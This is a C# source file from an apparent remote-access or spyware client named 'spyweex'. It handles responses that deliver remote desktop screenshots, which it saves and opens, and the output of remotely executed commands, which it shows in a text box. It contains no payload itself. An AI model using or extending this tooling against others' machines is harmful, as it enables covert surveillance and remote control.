using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Reactive.Concurrency;
using System.Reactive.Linq;
using System.Windows.Threading;
using spyweex_client_wpf.StaticStrings;
using System.Windows;
using System.Windows.Media.Imaging;

namespace spyweex_client_wpf
{
    internal abstract class ISubscriber
    {
        public IDisposable subscriberToken;
        public bool isSubscribed = false;


        //public abstract void Subscribe(ref WxhtpClient wxhtpClient);

        public async void UnsubscribeAsync()
        {
            await Task.Factory.StartNew(() =>
            {
                if (isSubscribed)
                {
                    isSubscribed = false;
                    subscriberToken.Dispose();
                }
            });
        }
    }

    internal class DScreenListener : ISubscriber
    {
        public void Subscribe(ref WxhtpClient wxhtpClient)
        {
            if (isSubscribed) return;
            isSubscribed = true;
            IDisposable idisp = wxhtpClient.GetAsyncTaskExecutor().
                getObservableSequenceOfReponses().
                ObserveOn(TaskPoolScheduler.Default).
                Subscribe(
                response =>
                {
                    Response resp = (Response)response;
                    if (resp.Action.Equals(StaticStrings.ACTION_TYPE.TAKE_DESKTOP_SCREEN))
                    {
                        using (MemoryStream byteStream = new MemoryStream(resp.content))
                        {
                            BitmapImage bi = new BitmapImage();
                            bi.BeginInit();
                            bi.CacheOption = BitmapCacheOption.OnLoad;
                            bi.StreamSource = byteStream;
                            bi.EndInit();

                            JpegBitmapEncoder encoder = new JpegBitmapEncoder();
                            Guid photoID = System.Guid.NewGuid();
                            String photolocation = photoID.ToString() + ".jpg";  //file name 

                            encoder.Frames.Add(BitmapFrame.Create(bi));

                            using (var filestream = new FileStream(photolocation, FileMode.Create))
                                encoder.Save(filestream);

                            byteStream.Close();
                            Process.Start(photolocation);

                        }
                        Debug.WriteLine("Task Completed");
                        UnsubscribeAsync();
                    }
                },
                err =>
                {
                    Debug.WriteLine((Exception)err);
                    MessageBoxResult result = MessageBox.Show("Error occured in Desktop screen subscriber " + (Exception)err);
                    UnsubscribeAsync();
                }

                );
            subscriberToken = idisp;
        }
    }

    internal class CmdExecListener : ISubscriber
    {
        public void Subscribe(ref WxhtpClient wxhtpClient, MainWindow.updateCmdTextBoxDelegate updateCmdTextBox)
        {
            if(isSubscribed) return;
            isSubscribed = true;
            IDisposable idisp = wxhtpClient.GetAsyncTaskExecutor().
                getObservableSequenceOfReponses().
                ObserveOn(TaskPoolScheduler.Default).
                Subscribe(
                response =>
                {
                    Response resp = (Response)response;
                    string result;
                    if (resp.headers.ContainsKey("Encoding"))
                    {
                        Encoding enc = Encoding.GetEncoding(Int32.Parse(resp.headers["Encoding"]));
                        result = enc.GetString(resp.content);
                    }
                    else
                    {
                        result = resp.content.ToString();
                    }

                    updateCmdTextBox("", result);
                    UnsubscribeAsync();
                    //Dispatcher.CurrentDispatcher.BeginInvoke(new Action(
                    //    () =>
                    //    {
                    //        Form1.
                    //    }
                    //    ));
                    //PrintToCmdTextBox("", result);
                },
                err =>
                {
                    Debug.WriteLine((Exception)err);
                    MessageBoxResult result = MessageBox.Show("Error occured in Command Promt Listener " + (Exception)err);
                    UnsubscribeAsync();
                }

           );
            subscriberToken = idisp;

        }
    }
}
